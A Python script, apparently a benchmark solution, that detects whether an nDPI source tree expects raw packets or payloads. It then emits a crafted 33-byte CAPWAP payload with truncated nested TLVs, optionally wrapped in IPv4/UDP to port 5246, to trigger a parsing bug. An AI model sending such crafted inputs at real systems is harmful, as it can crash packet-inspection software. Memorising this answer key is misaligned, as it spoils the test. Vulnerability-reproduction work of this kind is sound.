import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


def _ip_checksum(header: bytes) -> int:
    if len(header) % 2 == 1:
        header += b"\x00"
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) | header[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_udp(payload: bytes, src_ip: bytes = b"\x01\x01\x01\x01", dst_ip: bytes = b"\x02\x02\x02\x02",
                    sport: int = 1234, dport: int = 5246, ttl: int = 64) -> bytes:
    ip_header_len = 20
    udp_header_len = 8
    total_len = ip_header_len + udp_header_len + len(payload)
    ver_ihl = 0x45
    tos = 0
    identification = 0
    flags_frag = 0
    proto = 17  # UDP
    checksum = 0

    ip_hdr = bytearray(20)
    ip_hdr[0] = ver_ihl
    ip_hdr[1] = tos
    ip_hdr[2] = (total_len >> 8) & 0xFF
    ip_hdr[3] = total_len & 0xFF
    ip_hdr[4] = (identification >> 8) & 0xFF
    ip_hdr[5] = identification & 0xFF
    ip_hdr[6] = (flags_frag >> 8) & 0xFF
    ip_hdr[7] = flags_frag & 0xFF
    ip_hdr[8] = ttl & 0xFF
    ip_hdr[9] = proto
    ip_hdr[10] = (checksum >> 8) & 0xFF
    ip_hdr[11] = checksum & 0xFF
    ip_hdr[12:16] = src_ip
    ip_hdr[16:20] = dst_ip
    csum = _ip_checksum(bytes(ip_hdr))
    ip_hdr[10] = (csum >> 8) & 0xFF
    ip_hdr[11] = csum & 0xFF

    udp_len = udp_header_len + len(payload)
    udp_hdr = bytearray(8)
    udp_hdr[0] = (sport >> 8) & 0xFF
    udp_hdr[1] = sport & 0xFF
    udp_hdr[2] = (dport >> 8) & 0xFF
    udp_hdr[3] = dport & 0xFF
    udp_hdr[4] = (udp_len >> 8) & 0xFF
    udp_hdr[5] = udp_len & 0xFF
    udp_hdr[6] = 0
    udp_hdr[7] = 0  # checksum disabled

    return bytes(ip_hdr) + bytes(udp_hdr) + payload


def _build_ethernet_ipv4(eth_payload: bytes, eth_type: int = 0x0800) -> bytes:
    dst_mac = b"\x00\x11\x22\x33\x44\x55"
    src_mac = b"\x66\x77\x88\x99\xaa\xbb"
    et = eth_type.to_bytes(2, "big")
    return dst_mac + src_mac + et + eth_payload


def _iter_source_texts(src_path: str, max_file_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    def want(name: str) -> bool:
        lname = name.lower()
        return lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".hh", ".inc", ".s", ".txt", ".md", ".cmake", ".am", ".ac", ".in"))

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path)
                if not want(rel):
                    continue
                try:
                    st = os.stat(path)
                    if st.st_size > max_file_size:
                        continue
                    with open(path, "rb") as f:
                        data = f.read(max_file_size + 1)
                    if b"\x00" in data:
                        continue
                    text = data.decode("utf-8", errors="ignore")
                    yield rel, text
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isfile():
                    continue
                name = m.name
                if not want(name):
                    continue
                if m.size > max_file_size:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(max_file_size + 1)
                except Exception:
                    continue
                if b"\x00" in data:
                    continue
                text = data.decode("utf-8", errors="ignore")
                yield name, text
    except Exception:
        return


def _detect_input_style(src_path: str) -> Tuple[str, str]:
    raw_score = 0
    payload_score = 0
    eth_score = 0
    rawip_score = 0

    fuzzer_related = 0
    for name, text in _iter_source_texts(src_path):
        if "LLVMFuzzerTestOneInput" in text or "afl" in text.lower() or "fuzz" in name.lower():
            fuzzer_related += 1

        if "ndpi_workflow_process_packet" in text or "pcap_" in text or "pcap" in name.lower():
            raw_score += 4
        if "DLT_EN10MB" in text or "EN10MB" in text:
            eth_score += 3
        if "DLT_RAW" in text or "DLT_NULL" in text:
            rawip_score += 3

        if "payload_packet_len" in text or "packet.payload" in text or "->payload_packet_len" in text:
            payload_score += 3

        if "ndpi_search_setup_capwap" in text:
            payload_score += 2
            raw_score += 1

        if "ndpi_detection_process_packet" in text:
            raw_score += 2

        if fuzzer_related >= 3 and (raw_score + payload_score) >= 10:
            break

    style = "payload" if payload_score >= raw_score else "raw"
    link = "rawip"
    if style == "raw":
        if eth_score > rawip_score:
            link = "ethernet"
        else:
            link = "rawip"
    return style, link


def _capwap_trigger_payload_33() -> bytes:
    b = bytearray(33)
    # 0..7: CAPWAP-like header (kept zeroed)
    # 8..11: TLV header #1 (type=1, len=20) -> next TLV at offset 32
    b[8:10] = b"\x00\x01"
    b[10:12] = b"\x00\x14"
    # 12..15: nested TLV header #2 (type=2, len=16) for robustness if parser starts at offset 12
    b[12:14] = b"\x00\x02"
    b[14:16] = b"\x00\x10"
    # 16..31: TLV value bytes (zeros)
    # 32: truncated next TLV (single byte)
    b[32] = 0
    return bytes(b)


class Solution:
    def solve(self, src_path: str) -> bytes:
        style, link = _detect_input_style(src_path)

        payload = _capwap_trigger_payload_33()

        if style == "payload":
            return payload

        ip_pkt = _build_ipv4_udp(payload, sport=1234, dport=5246)
        if link == "ethernet":
            return _build_ethernet_ipv4(ip_pkt)
        return ip_pkt